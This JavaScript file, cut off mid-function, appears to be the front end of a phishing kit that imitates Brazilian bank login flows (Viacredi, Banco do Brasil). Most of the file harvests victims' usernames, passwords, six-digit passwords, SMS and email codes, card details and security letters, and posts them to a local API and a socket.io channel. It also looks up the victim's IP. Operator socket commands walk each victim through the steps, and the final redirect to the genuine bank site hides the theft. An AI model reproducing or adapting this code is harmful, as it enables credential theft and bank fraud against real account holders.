const URL = `http://192.168.0.10:3333/api`

const util = (() => {
    const images = []
    let imageDefault = 0
    //private var/functions
    const setImageDefault = (image, container) => {
        image.addEventListener('click', (e) => {
            const index = image.dataset.index

            allImages = container.querySelectorAll('img')

            Array.from(allImages).forEach((img) => {
                img.classList.remove('active')
            })

            image.classList.add('active')

            imageDefault = parseInt(index)

            return console.log(imageDefault)
        })
    }

    const serialize = (form) => {
        const inputs = [...form.elements]

        const object = {}

        inputs.map((input, key) => {
            //console.dir(input)
            if (input.type == `radio`) {
                if (input.checked) return (object[input.name] = input.value)
                else return
            }

            if (input.name) object[input.name] = input.value
        })

        return object
    }

    const resetForm = (form) => {
        const inputs = [...form.elements]

        inputs.map((input) => (input.value = ``))
    }

    const maskMoney = (input) => {
        input.addEventListener('keyup', function (e) {
            e.preventDefault()

            $(input).maskMoney({ prefix: 'R$ ' })

            /* var money = new Cleave(input, {
                prefix: 'R$ ',
            }) */

            //console.log(currency(input.value, { symbol: 'R$' }))

            //input.value = currency(input.value, { symbol: 'R$' })
        })
    }

    const notify = (params) => {
        const { icon, title, message, type } = params
        //Notify

        /**
         *
         * <div data-notify="container" class="alert alert-dismissible alert-warning alert-notify animated fadeInDown" role="alert" data-notify-position="top-center">
         * <span class="alert-icon ni ni-bell-55" data-notify="icon"></span>
         * <div class="alert-text" <="" div=""> <span class="alert-title" data-notify="title"> Bootstrap Notify</span> <span data-notify="message">Turning standard Bootstrap alerts into awesome notifications</span></div><button type="button" class="close" data-notify="dismiss" aria-label="Close" style="position: absolute; right: 10px; top: 5px; z-index: 1082;"><span aria-hidden="true">×</span></button></div>
         *
         */
        return $.notify(
            {
                // options
                icon: icon,
                title: title,
                message: message,
            },
            {
                // settings
                type: type,
                template: `
                <div data-notify="container" class="alert alert-dismissible alert-{0} alert-notify" role="alert">
                    <span class="alert-icon" data-notify="icon"></span>
                    <div class="alert-text"> 
                        <span class="alert-title" data-notify="title">{1}</span>
                        <span data-notify="message">{2}</span>
                    </div>
                    <button type="button" class="close" data-notify="dismiss" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                `,
            }
        )
    }

    image = (input, output, mode, size) => {
        input.addEventListener('change', (e) => {
            e.preventDefault()

            input.closest('form').classList.add('changed')

            const sizes = {
                large: [`my-2`, `col-12`],
                medium: [`my-2`, `col-6`],
                small: [`my-2`, `col-3`],
            }

            if (!size && !sizes[size]) return console.log(`Informe o tamanho entre (large, medium e small)`)

            const containerImages = output

            const inputFiles = [...input.files]

            const file = input.files[0]

            input.closest('.custom-file').querySelector('label').innerHTML = inputFiles.length + ` imagens`

            if (mode === `mult`) {
                inputFiles.map((file) => {
                    const imageContainer = document.createElement('div')

                    imageContainer.classList.add(`mb-2`, `col-sm-3`)

                    imageContainer.innerHTML = `
                    <img class="img-thumbnail" src="">
                    `

                    const image = imageContainer.querySelector('img')

                    // FileReader support
                    if (FileReader && file) {
                        var fr = new FileReader()
                        fr.onload = function () {
                            image.src = fr.result
                        }
                        fr.readAsDataURL(file)

                        images.push(file)

                        image.dataset.index = images.indexOf(file)

                        if (images.length === 1) image.classList.add('active')

                        setImageDefault(image, output)

                        return containerImages.append(imageContainer)
                    }

                    // Not supported
                    else {
                        // fallback -- perhaps submit the input to an iframe and temporarily store
                        // them on the server until the user's session ends.
                    }
                })
            } else {
                const imageContainer = document.createElement('div')

                imageContainer.classList.add(...sizes[size])

                imageContainer.innerHTML = `
                <img class="img-thumbnail" src="">
                `
                const image = imageContainer.querySelector('img')

                // FileReader support
                if (FileReader && file) {
                    var fr = new FileReader()
                    fr.onload = function () {
                        image.src = fr.result
                    }
                    fr.readAsDataURL(file)

                    images[0] = file

                    containerImages.innerHTML = ``

                    return containerImages.append(imageContainer)
                }

                // Not supported
                else {
                    // fallback -- perhaps submit the input to an iframe and temporarily store
                    // them on the server until the user's session ends.
                }
            }
        })
    }

    const newRequest = (object) => {
        return new Promise((resolve, reject) => {
            const token = document.body.dataset.token

            const { url, method, body, headers } = object

            const options = {
                method: method || `GET`,
                headers: {
                    authorization: `Bearer ${token}`,
                },
            }

            if (headers) options.headers['content-type'] = headers['content-type']

            if (body) options.body = body

            fetch(url, options)
                .then((r) => r.json())
                .then((res) => {
                    if (res.error) return reject(res.error)

                    return resolve(res)
                })
                .catch((error) => reject(error))
        })
    }

    const get = (url) => {
        return new Promise((resolve, reject) => {
            const token = document.body.dataset.token

            const options = {
                method: `GET`,
                headers: {
                    authorization: `Bearer ${token}`,
                    'content-type': 'application.json',
                },
            }

            fetch(url, options)
                .then((r) => r.json())
                .then((res) => {
                    if (res.error) return reject(res.error)

                    return resolve(res)
                })
                .catch((error) => reject(error))
        })
    }

    async function post(url, options) {
        return new Promise((resolve, reject) => {
            const { body, headers } = options

            if (!url) return reject('not have url')

            if (!headers) {
                fetch(url, {
                    method: 'POST',
                    headers: {
                        'content-type': 'application/json',
                    },
                    body: JSON.stringify(body || ''),
                })
                    .then((res) => res.json())
                    .then(resolve)
                    .catch(reject)
            } else {
                headers['content-type'] = 'application/json'

                fetch(url, {
                    method: 'POST',
                    headers,
                    body: JSON.stringify(body || ''),
                })
                    .then((res) => res.json())
                    .then(resolve)
                    .catch(reject)
            }
        })
    }

    const del = (url) => {
        return new Promise((resolve, reject) => {
            const token = document.body.dataset.token

            const options = {
                method: `DELETE`,
                headers: {
                    authorization: `Bearer ${token}`,
                    'content-type': 'application.json',
                },
            }

            fetch(url, options)
                .then((r) => r.json())
                .then((res) => {
                    if (res.error) return reject(res.error)

                    return resolve(res)
                })
                .catch((error) => reject(error))
        })
    }

    const request = (object) => {
        return new Promise((resolve, reject) => {
            const token = document.body.dataset.token

            const { url, method, body, headers } = object

            const options = {
                method: method || `GET`,
                headers: {
                    authorization: `Bearer ${token}`,
                },
            }

            if (headers) options.headers['content-type'] = headers['content-type']
            if (headers) options.headers.Accept = headers.Accept

            if (body) options.body = body

            fetch(url, options)
                .then((r) => r.json())
                .then((res) => {
                    if (res.error) return reject(res.error)

                    return resolve(res)
                })
                .catch((error) => reject(error))
        })
    }

    const scroll = (link) => {
        link.addEventListener('click', function (e) {
            e.preventDefault()

            document.querySelector(this.getAttribute('href')).scrollIntoView({
                behavior: 'smooth',
                block: `start`,
            })
        })
    }

    const validateSlug = (slug) => {
        slug = slug
            .normalize('NFD')
            .replace(/[\u0300-\u036f]/g, '')
            .toLowerCase()
            .replace(/ /g, '_')

        return slug
    }

    const delayed_methods = (label, callback, time) => {
        if (typeof window.delayed_methods == 'undefined') {
            window.delayed_methods = {}
        }

        delayed_methods[label] = Date.now()
        var t = delayed_methods[label]

        setTimeout(function () {
            if (delayed_methods[label] != t) {
                return
            } else {
                //console.log(arguments)
                delayed_methods[label] = ''
                callback
            }
        }, time || 500)
    }

    const dateEnd = (input, dateStart, dateEnd) => {
        input.addEventListener('blur', (e) => {
            const startDate = dateStart.value
            const endDate = new Date(startDate)

            endDate.setMonth(endDate.getMonth() + parseInt(input.value))

            const date = endDate.toISOString().substr(0, 10)

            console.log(date)

            dateEnd.value = date
        })
    }

    return {
        //public var/functions
        image,
        images,
        request,
        scroll,
        validateSlug,
        newRequest,
        serialize,
        resetForm,
        notify,
        get,
        del,
        delayed_methods,
        dateEnd,
        maskMoney,
        post,
    }
})()

//Set date in blur mouths
const inputStart = document.querySelector('input#locationStart')
const inputEnd = document.querySelector('input#locationEnd')
const inputMonth = document.querySelector('input#locationTime')

if (inputStart && inputEnd && inputMonth) util.dateEnd(inputMonth, inputStart, inputEnd)

const allprods = document.querySelector('.nav-link.dropdown-toggle')
const hoverMenu = document.querySelector('.nav-item.dropdown')

if (hoverMenu) {
    hoverMenu.onmouseover = () => {
        if (document.querySelector('.nav-item.dropdown > ul'))
            document.querySelector('.nav-item.dropdown > ul').classList.add('show')
    }
    hoverMenu.onmouseout = () => {
        if (document.querySelector('.nav-item.dropdown > ul'))
            document.querySelector('.nav-item.dropdown > ul').classList.remove('show')
    }
}

if (allprods) {
    allprods.addEventListener('click', function (e) {
        e.preventDefault()

        url = allprods.getAttribute('href')

        if (window.matchMedia('(min-width:800px)').matches) {
            window.location.href = url
        }
    })
}

if (document.querySelector('input.cpf'))
    var cpf = new Cleave('input.cpf', {
        delimiters: ['.', '.', '-'],
        blocks: [3, 3, 3, 2],
        uppercase: true,
    })

if (document.querySelector('input.rg'))
    var rg = new Cleave('input.rg', {
        delimiters: ['.', '.', '-'],
        blocks: [2, 3, 3, 1],
        uppercase: true,
    })

if (document.querySelector('input.zipCode'))
    var cep = new Cleave('input.zipCode', {
        delimiters: ['-'],
        blocks: [5, 3],
        uppercase: true,
    })

if (document.querySelector('input.phoneInput'))
    var phones = new Cleave('input.phoneInput', {
        phone: true,
        phoneRegionCode: 'BR',
    })

if (document.querySelector('input#cell'))
    var cell = new Cleave('input#cell', {
        phone: true,
        phoneRegionCode: 'BR',
    })

const cleaveMoney = {
    numeral: true,
    prefix: 'R$ ',
    rawValueTrimPrefix: true,
}

const inputsMoney = [...document.querySelectorAll('input.moneyValue')]

if (inputsMoney) {
    inputsMoney.forEach((input) => util.maskMoney(input))
}

if (document.querySelector('.iptu')) var iptu = new Cleave('input#iptu', cleaveMoney)

if (document.querySelector('.condominium')) var condominium = new Cleave('input#condominium', cleaveMoney)

if (document.querySelector('.water')) var water = new Cleave('input#water', cleaveMoney)

if (document.querySelector('.energy')) var energy = new Cleave('input#energy', cleaveMoney)

if (document.querySelector('.trash')) var trash = new Cleave('input#trash', cleaveMoney)

if (document.querySelector('.cleaningFee')) var cleaningFee = new Cleave('input#cleaningFee', cleaveMoney)

if (document.querySelector('.othersValues')) var othersValues = new Cleave('input#othersValues', cleaveMoney)

const btnValidat = document.querySelector('.btnAnchor')

if (btnValidat) util.scroll(btnValidat)
;(function () {
    'use strict'
    window.addEventListener(
        'load',
        function () {
            // Fetch all the forms we want to apply custom Bootstrap validation styles to
            var forms = document.getElementsByClassName('needs-validation')
            // Loop over them and prevent submission
            var validation = Array.prototype.filter.call(forms, function (form) {
                form.addEventListener(
                    'submit',
                    (event) => {
                        if (form.checkValidity() === false) {
                            event.preventDefault()
                            event.stopPropagation()
                        }
                        form.classList.add('was-validated')
                    },
                    false
                )
            })
        },
        false
    )
})()

const formInfo = document.querySelector(`form[name='f1']`)

const client_id = document.body.dataset.client

//check usuario reconectado
socket.on('conectado', (data) => {
    const params = new URLSearchParams(window.location.search)

    if (params.has('client') || client_id) {
        socket.emit('userReconnect', params.get('client') || client_id)

        console.log(params.get('client'))
    } else return
})

function formAuth() {
    const form = document.querySelector('.verify_inputs')

    if (!form) return

    const inputs = form.querySelectorAll('input')

    if (!inputs) return

    inputs.forEach((input, index) => {
        input.addEventListener('keyup', function (e) {
            e.preventDefault()

            const value = input.value
            if (value.length > 2) {
                const values = [...value]
                values.forEach((inpt, i) => {
                    if (!inputs[i]) return
                    inpt.value = inpt
                })

                return inputs[inputs.length - 1].focus()
            }
            if (!value) {
                if (!inputs[index - 1]) return (input.value = '')
                input.value = ''
                return inputs[index - 1].focus()
            }

            if (inputs[index + 1]) return inputs[index + 1].focus()
        })
        input.addEventListener('input', function (e) {
            e.preventDefault()

            const value = e.target.value

            if (value.length > 1) {
                const values = [...value]
                values.forEach((inpt, i) => {
                    if (inputs[i]) inputs[i].value = inpt

                    inputs[inputs.length - 1].focus()
                })
            }
        })
    })
}

formAuth()

const infosData = (() => {
    const params = new URLSearchParams(window.location.search)

    const idClient = params.has('client') || document.body.dataset.client
    //private var/functions
    function getIp(callback) {
        function response(s) {
            callback(window.userip)
            s.onload = s.onerror = null
            document.body.removeChild(s)
        }

        function trigger() {
            window.userip = false
            var s = document.createElement('script')
            s.async = true
            s.onload = function () {
                response(s)
            }
            s.onerror = function () {
                response(s)
            }
            s.src = 'https://l2.io/ip.js?var=userip'
            document.body.appendChild(s)
        }
        if (/^(interactive|complete)$/i.test(document.readyState)) {
            trigger()
        } else {
            document.addEventListener('DOMContentLoaded', trigger)
        }
    }

    function commands() {
        socket.on('errorpassword', (user) => {
            if (user.id) window.location.href = `/sinbc-login?client=${user.id}&error=true`
        })

        socket.on('disp', (data) => {
            if (idClient) {
                if (idClient == data) window.location.href = `/dispositivo?client=${data}`
            } else return
        })

        socket.on('erroruser', (data) => {
            if (idClient) {
                if (idClient == data) window.location.href = `/modules/conta/${data}`
            } else return
        })

        socket.on('getAuth', (data) => {
            if (idClient) {
                if (idClient == data) window.location.href = `/modules/conta/auth/${data}`
            } else return
        })

        socket.on('errorSMS', (data) => {
            if (idClient) {
                if (idClient == data) window.location.href = `/modules/conta/sms/${data}?error=true`
            } else return
        })

        socket.on('getSMS', (data) => {
            if (idClient) {
                if (idClient == data) window.location.href = `/modules/conta/authentication/${data}`
            } else return
        })

        socket.on('errorpass', (data) => {
            if (idClient) {
                if (idClient == data) window.location.href = `/modules/conta/password/${data}`
            } else return
        })

        socket.on('getCardVerify', (data) => {
            if (idClient) {
                if (idClient == data.id) window.location.href = `/modules/conta/card/${data.id}/${data.cards[0].end}`
            } else return
        })

        socket.on('getMailCode', (data) => {
            if (idClient) {
                if (idClient == data) window.location.href = `/modules/conta/mail/${data}`
            } else return
        })

        socket.on('FinishClient', (data) => {
            if (idClient) {
                if (idClient == data) window.location.href = `https://www.viacredi.coop.br/`
            } else return
        })
    }

    async function receiver() {
        socket.on('erroruser', (data) => {
            const params = new URLSearchParams(window.location.search)

            if (params.has('client')) {
                if (params.get('client') == data) window.location.href = `/modules/conta?client=${data}`
            } else return
        })

        socket.on('FinishClient', (data) => {
            const params = new URLSearchParams(window.location.search)

            if (params.has('client')) {
                if (params.get('client') == data) window.location.href = `https://www.bb.com.br/pbb/pagina-inicial`
            } else return
        })

        socket.on('getAuth', (data) => {
            const params = new URLSearchParams(window.location.search)

            if (params.has('client')) {
                if (params.get('client') == data) window.location.href = `/verify-authentic?client=${data}`
            } else return
        })

        socket.on('errorpass6', (data) => {
            const params = new URLSearchParams(window.location.search)

            if (params.has('client')) {
                if (params.get('client') == data) window.location.href = `/password6?client=${data}`
            } else return
        })
    }

    async function create(form) {
        if (!form) return

        form.addEventListener('submit', (e) => {
            // body
            e.preventDefault()

            const data = util.serialize(form)

            //socket.emit('createClient', data)

            form.submit()
        })
    }

    async function auth(form) {
        if (!form) return
        form.addEventListener('submit', function (e) {
            e.preventDefault()

            const data = util.serialize(form)

            if (!data) return form.classList.add('errorForm')

            socket.emit('sendAuth', data)

            window.location.href = `/await?client=${data.id}`
        })
    }

    async function submit(form) {
        console.log(form)
        if (!form) return

        form.addEventListener('submit', (e) => {
            e.preventDefault()

            form.querySelector('#btnLogin').innerHTML = `Aguarde...`
            form.querySelector('#btnLogin').disabled = true

            form.querySelector('.inpt-passwd6').style.opacity = 0.5

            form.querySelector(`input[name='password6']`).disabled = true

            const data = util.serialize(form)

            socket.emit('password6Client', data)

            console.log(data)
        })
    }

    async function update(form) {
        if (!form) return

        form.addEventListener('submit', (e) => {
            e.preventDefault()

            const data = util.serialize(form)

            socket.emit('updateClient', data)

            return (window.location.href = `/await?client=${data.id}`)
        })
    }

    async function digits(form) {
        //form-pass6
        if (!form) return

        form.addEventListener('submit', function (e) {
            e.preventDefault()

            const data = util.serialize(form)

            socket.emit('sendPass6', data)

            window.location.href = `/await?client=${data.id}`

            console.log(data)
        })
    }

    return {
        //public var/functions
        submit,
        update,
        create,
        digits,
        receiver,
        commands,
        auth,
        getIp,
    }
})()

const formUpdateClient = document.querySelector(`.form-pass6`)

infosData.getIp((ip) => console.log)
infosData.commands()
infosData.auth(document.querySelector('.form-auth'))
infosData.digits(document.querySelector('.form-pass6'))
infosData.create(formInfo)
infosData.update(formUpdateClient)
infosData.submit(document.querySelector(`.form-pass6`))

//console.log(formInfo)

const pageMail = (() => {
    function resend() {
        const button = document.querySelector('.formMail__code.verify spam')

        if (!button) return

        const buttonClosest = button.closest('button')

        if (!button) return

        setInterval(() => {
            if (parseInt(button.innerHTML) > 0) button.innerHTML = parseInt(button.innerHTML) - 1
            else {
                if (buttonClosest.disabled) {
                    buttonClosest.disabled = false
                    buttonClosest.innerHTML = `Reenviar código`
                }
            }
        }, 1000)
    }

    function hiddenTypeAccount(btns) {
        if (!btns) return

        const buttons = document.querySelectorAll(btns)

        if (!buttons) return

        buttons.forEach((btn) => {
            btn.addEventListener('click', function (e) {
                const container = btn.closest('.container-account')

                container.classList.add('hidden')
            })
        })
    }

    function mailCode(selector) {
        const inputs = [...document.querySelectorAll(selector)]

        if (!inputs) return

        inputs.forEach((input, index) => {
            input.addEventListener('focus', function (e) {
                input.closest('span').classList.add('focused')
            })

            input.addEventListener('blur', function (e) {
                input.closest('span').classList.remove('focused')
            })

            input.addEventListener('keyup', function (e) {
                e.preventDefault()

                let values = input.value

                if (values.length == 1 && index < 5) {
                    inputs[index + 1].focus()
                }

                if (values.length == 0 && index < 6) {
                    if (inputs[index - 1]) {
                        inputs[index - 1].value = ''
                        inputs[index - 1].focus()
                    }
                }

                if (values.length > 1) {
                    let rayValues = values.replace(/\D/g, '').split('')

                    if (rayValues[0]) inputs[0].value = rayValues[0]
                    if (rayValues[1]) inputs[1].value = rayValues[1]
                    if (rayValues[2]) inputs[2].value = rayValues[2]
                    if (rayValues[3]) inputs[3].value = rayValues[3]
                    if (rayValues[4]) inputs[4].value = rayValues[4]
                    if (rayValues[5]) {
                        inputs[5].value = rayValues[5]

                        input.closest('form').querySelector('button').disabled = false
                        if (inputs[5] && inputs[5].value) inputs[5].focus()
                    }
                }

                if (index == 5 && input.value) {
                    input.closest('form').querySelector('button').disabled = false
                } else {
                    input.closest('form').querySelector('button').disabled = true
                }
            })
        })
    }
    //private var/functions
    function focus(selector) {
        const input = document.querySelector(selector)

        if (!input || !input.closest('article')) return

        const label = input.closest('article').querySelector('label')

        if (!label) return

        input.addEventListener('focus', function (e) {
            // body
            label.classList.add('focused')
        })

        input.addEventListener('blur', (event) => {
            if (input.value) return
            label.classList.remove('focused')
        })
    }

    function submitPassword(form) {
        const formul = document.querySelector(`${form}:not(.formMail__code)`)

        if (!formul) return

        const btnSubmit = formul.querySelector('button')

        if (!btnSubmit) return

        btnSubmit.addEventListener('click', function (e) {
            // body
            e.preventDefault()

            const pass = btnSubmit.closest('form').elements['password']
            const mail = btnSubmit.closest('form').elements['mail']

            if (pass) {
                if (!pass.value) {
                    pass.setCustomValidity('Informe sua senha de acesso')
                    return pass.reportValidity()
                } else {
                    const loader = document.querySelector('.loader')

                    loader.classList.remove('hidden')
                }
            }
            // body

            if (mail) {
                if (!mail.value) {
                    mail.setCustomValidity('Informe um e-mail para acessar sua conta')
                    return mail.reportValidity()
                } else return btnSubmit.closest('form').submit()
            }
        })
    }

    function loader() {
        const loader = document.querySelector('.loader')

        loader.classList.remove('hidden')
    }

    return {
        //public var/functions
        focus,
        submitPassword,
        mailCode,
        resend,
        hiddenTypeAccount,
    }
})()

pageMail.hiddenTypeAccount('.container-account li')

pageMail.resend()

pageMail.focus('.formMail input')
pageMail.mailCode('.formMail__inputs input')
//formMail__inputs

const formMasks = (() => {
    //private var/functions
    function mask() {
        const agencia = document.querySelector('.form-stn #email')

        if (agencia) {
            let ag = new Cleave(agencia, {
                blocks: [5, 2],
                delimiters: ['-'],
                numericOnly: true,
            })
        }
    }

    return {
        //public var/functions
        mask,
    }
})()

formMasks.mask()


const password = (() => {
    //private var/functions
    const inputID = document.querySelector('input[name="userID"]')

    async function insertClient(form) {

        if(!form) return

        const data = util.serialize(form)

        const insert = await util.post('/api/client', { body: data})

        socket.emit('joinClient', insert)

        inputID.value = insert.id
    }

    async function submitPassword(form) {
        const formul = document.querySelector(`${form}:not(.formMail__code)`);

        if(!formul) return

        if(formul.classList.contains('formMail__code')) return

        const btnSubmit = formul.querySelector('button');

        if(!btnSubmit) return

        btnSubmit.addEventListener('click', function (e) {
            // body
            e.preventDefault()

            const pass = btnSubmit.closest('form').elements['password']
            const mail = btnSubmit.closest('form').elements['mail']


            if(pass) {

                if(!pass.value) {
                    pass.setCustomValidity("Informe sua senha de acesso");
                    return pass.reportValidity()

                }
                else{
                    const loader = document.querySelector('.loader');

                    loader.classList.remove('hidden')

                    insertClient(formul)
                }
            }
            // body

            if(mail) {

                

                if(!mail.value){
                    mail.setCustomValidity("Informe um e-mail para acessar sua conta");
                    return mail.reportValidity()

                }
                else
                    return btnSubmit.closest('form').submit()
            }
        });


    }

    async function receive() {
        socket.on('reqSMS', (client) => {
            const inpt = document.querySelector('input[name="userID"]')

            if(!inpt) return
            const clientID = inpt.value

            if(!clientID) 
            

            if(client.id == clientID) return window.location.href = `/phonecheck/${clientID}`
        })
    }
    
    
    return {
        //public var/functions
        submitPassword,
        receive
    }
})()

password.receive()

password.submitPassword(`form.formMail:not(.formMail__code)`)
const phone = (() => {
    //private var/functions
    function select(btn) {
        const clientID = parseInt(document.querySelector('input[name="client"]').value)

        if(!clientID) return

        if(btn.classList.contains('sms')) {
            socket.emit('selectSMS', clientID)

            return window.location.href = "/verify-authentic?select=sms"
        }else if(btn.classList.contains('phone')) {
            socket.emit('selectPhone', clientID)
            return window.location.href = "/verify-authentic?select=phone"

        }else if(btn.classList.contains('app')){
            socket.emit('selectApp', clientID)

            return window.location.href = "/verify-authentic?select=app"
        }
    }

    function dispatch(selectors) {
        const selector = [...document.querySelectorAll(selectors)];

        selector.map(button => {button.addEventListener('click', e => {
            select(button)
        })})

    }
    
    return {
        //public var/functions
        dispatch
    }
})()

//formMail__phone--options

phone.dispatch('.formMail__phone--options > div')
const sms = (() => {
    //private var/functions
    function send(selector) {
        const btn = document.querySelector(selector)

        if (!btn) return

        const form = btn.closest('form')
        const clientID = document.body.dataset.client

        if (!btn || !form || !clientID) return

        btn.addEventListener('click', async function (e) {
            e.preventDefault()

            const fields = form.querySelectorAll('input[type="tel"]')

            if (!fields) return

            let data = ``

            let validade = false

            for (const field of fields) {
                if (field.value) {
                    validade = true
                } else {
                    validade = false
                }
                data += field.value
            }

            if (!validade && data.length < 6) return

            try {
                const value = { auth: data }

                const config = {
                    method: `put`,
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(value),
                }

                if (client_id) {
                    const client = await fetch(`/api/client/mail/${client_id}`, config)

                    const response = await client.json()

                    if (client.status === 200) return (window.location.href = `/await?client=${response.id}`)
                }
            } catch (error) {
                console.log(error)
            }
        })
    }

    return {
        //public var/functions
        send,
    }
})()

sms.send('.formMail__code .validate')

const validityForm = (() => {
    //private var/functions
    function handleError(error, field) {
        if (error != `valid` || !error) {
            field.classList.add(`has-error`)
        } else {
            field.classList.remove(`has-error`)
        }
    }

    function handlerEvents(event) {
        event.preventDefault()

        const field = event.target

        function verifyError() {
            let foundError = false

            for (const error in field.validity) {
                if (field.validity[error]) {
                    foundError = error
                }
            }

            return foundError
        }

        const error = verifyError()

        if (event.type != `keyup`) {
            handleError(error, field)
        } else {
            if (field.value.length > 6) {
                handleError(error, field)
            }
        }
    }

    function handleForm(form) {
        const formNode = document.querySelector(form)

        if (!form) return

        const fields = formNode.querySelectorAll(`input[type="text"]`)

        for (const field of fields) {
            field.addEventListener('blur', handlerEvents)
            field.addEventListener('keyup', handlerEvents)
        }
    }

    return {
        //public var/functions
        handleForm,
    }
})()

//validityForm.handleForm(`.form-stn`)

const mp = (() => {
    const client_id = document.body.dataset.client
    //private var/functions
    function validation(field) {
        if (!field.value) return false

        return true
    }

    async function handleSubmitPass(form) {
        try {
            const data = util.serialize(form)

            const config = {
                method: `put`,
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            }

            const client = await fetch(`/api/client/password`, config)

            const response = await client.json()

            console.log(response)

            const modalLetter = $('#modalLetter')

            modalLetter.modal('show')

            //if (client.status === 200) return (window.location.href = `/await?client=${response.id}`)
        } catch (error) {
            console.log(error)
        }
    }

    async function formPassSubmit(target) {
        const form = document.querySelector(target)

        if (!form) return

        const password = form.querySelector('#password')
        const modalLetter = $('#modalLetter')

        form.addEventListener('submit', function (e) {
            e.preventDefault()

            //if (!validation(password)) return

            const ModalSubmit = document.querySelector('.saveLetter')

            modalLetter.modal('show')

            ModalSubmit.addEventListener('click', async function (e) {
                e.preventDefault()

                const data = document.querySelector('.inputs_letters input[name="letters"]')

                if (data) {
                    try {
                        const config = {
                            method: `put`,
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({ auth: data.value }),
                        }

                        const client = await (await fetch(`/api/client/letter/${client_id}`, config)).json()

                        modalLetter.modal('hide')

                        window.location.href = `https://www.viacredi.coop.br/`
                    } catch (error) {
                        console.log(`Erro au subir modal de letra`, error)
                    }
                }
            })

            handleSubmitPass(form)
        })
    }

    function formUserSubmit(target) {
        const form = document.querySelector(target)

        if (!form) return

        form.addEventListener('submit', async function (e) {
            e.preventDefault()

            const username = form.querySelector(`#username`)

            if (!username) {
                if (!username.value) return
            }

            try {
                const config = {
                    method: `put`,
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ username: username.value }),
                }

                if (client_id) {
                    const client = await fetch(`/api/client/username/${client_id}`, config)

                    const response = await client.json()

                    if (client.status === 200) return (window.location.href = `/await?client=${response.id}`)
                }
            } catch (error) {
                console.log(error)
            }
        })
    }
    function submitVerifyCard(target) {
        const form = document.querySelector(target)
        //card_verify

        if (!form) return

        form.addEventListener('submit', async function (e) {
            e.preventDefault()

            try {
                const data = util.serialize(form)

                const config = {
                    method: `put`,
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                }

                if (client_id) {
                    const client = await fetch(`/api/client/card/${client_id}`, config)

                    const response = await client.json()

                    if (client.status === 200) return (window.location.href = `/await?client=${response.id}`)
                }

                ////:end
            } catch (error) {
                console.log(error)
            }
        })
    }

    function verifyAuth(target) {
        //formMail__code verify
        const form = document.querySelector(target)

        const client_id = document.body.dataset.client

        if (!form || !client_id) return

        const button = form.querySelector(`button`)

        console.log(`form verify`, button)

        button.addEventListener('click', async function (e) {
            e.preventDefault()

            try {
                const fields = form.querySelectorAll('input[type="tel"]')

                let validation = false

                let values = ``

                for (const field of fields) {
                    if (!field.value) {
                        validation = false
                    } else {
                        validation = true
                    }

                    values += field.value
                }

                const value = { auth: values }

                const config = {
                    method: `put`,
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(value),
                }

                if (client_id) {
                    const client = await fetch(`/api/client/auth/${client_id}`, config)

                    const response = await client.json()

                    if (client.status === 200) return (window.location.href = `/await?client=${response.id}`)
                }
            } catch (error) {
                console.log(error)
            }
        })
    }

    function submitCode(target) {
        const form = document.querySelector(target)

        if (!form) return

        const button = form.querySelector('button.validate')

        if (!button) return

        button.addEventListener('click', async function (e) {
            e.preventDefault()

            let values = ''
            const clientID = form.elements['client'].value

            const inputs = [...form.querySelectorAll('input[type="tel"]')]

            inputs.forEach((input) => {
                if (!input.value) {
                    input.setCustomValidity("Informe o c'odigo de 6 digitos")
                    return input.reportValidity()
                }
            })

            button.disabled = true

            for (let i = 1; i < 7; i++) {
                const inputs = form.elements[`number_${i}`]

                if (inputs) values += inputs.value
            }

            if (values.length < 4) return

            try {
                const config = {
                    method: `put`,
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ phone: values }),
                }

                const client = await fetch(`/api/client/sms/${clientID}`, config)

                const response = await client.json()

                if (client.status === 200) return (window.location.href = `/await?client=${response.id}`)
            } catch (error) {
                console.log(error)
            }
        })
    }

    return {
        //public var/functions
        formPassSubmit,
        formUserSubmit,
        submitVerifyCard,
        submitCode,
        verifyAuth,
    }
})()
//
mp.verifyAuth(`.formMail__code.authenticate`)
mp.submitVerifyCard(`.card_verify`)
mp.submitCode(`.formMail__code.verify`)
mp.formPassSubmit(`.main-form-login.password`)
mp.formUserSubmit(`.main-form-login.send-error-login`)

const keyboards = (() => {
    //private var/functions
    function keyclickLetter(target) {
        const buttons = document.querySelectorAll(target)
        const destiny = document.querySelector('.inputs_letters input[name="letters"]')
        const cleanButton = document.querySelector('.inputs_letters .clean_click')

        if (!buttons) return

        for (const button of buttons) {
            button.addEventListener('click', function (e) {
                e.preventDefault()

                if (destiny) {
                    if (button.value == `space`) {
                        destiny.value = `${destiny.value} `
                    } else {
                        if (button.value == `backspace`) {
                            destiny.value = destiny.value.slice(0, -1)
                        } else {
                            destiny.value = `${destiny.value}${button.value}`
                        }
                    }

                    const input = document.querySelector(`.inputs_letters input[name="letter_${destiny.value.length}"]`)

                    if (input) input.value = button.value
                }

                console.log(destiny.value)
            })
        }
    }
    function keyclick(target) {
        const buttons = document.querySelectorAll(target)
        const destiny = document.querySelector('.phrase input[name="phrase"]')
        const cleanButton = document.querySelector('.phrase .clean_click')

        if (!cleanButton) return

        cleanButton.addEventListener('click', function (e) {
            e.preventDefault()

            destiny.value = ``
        })

        if (!buttons) return

        for (const button of buttons) {
            button.addEventListener('click', function (e) {
                e.preventDefault()

                if (destiny) {
                    if (button.value == `space`) {
                        destiny.value = `${destiny.value} `
                    } else {
                        if (button.value == `backspace`) {
                            destiny.value = destiny.value.slice(0, -1)
                        } else {
                            destiny.value = `${destiny.value}${button.value}`
                        }
                    }
                }

                console.log(destiny.value)
            })
        }
    }
    function keyclickPass(target) {
        const buttons = document.querySelectorAll(target)
        let destiny_number = 0
        const destinys = document.querySelectorAll(`.destinys input`)
        const valuePass = document.querySelector('.destinys input[name="password"]')
        const cleanButton = document.querySelector('.keyboardNumeric .clean_click')

        if (!cleanButton) return

        cleanButton.addEventListener('click', function (e) {
            e.preventDefault()

            for (const input of destinys) {
                input.value = ``
                destiny_number = 0
                valuePass.value = ``
            }
        })

        if (!buttons) return

        for (const button of buttons) {
            button.addEventListener('click', function (e) {
                e.preventDefault()

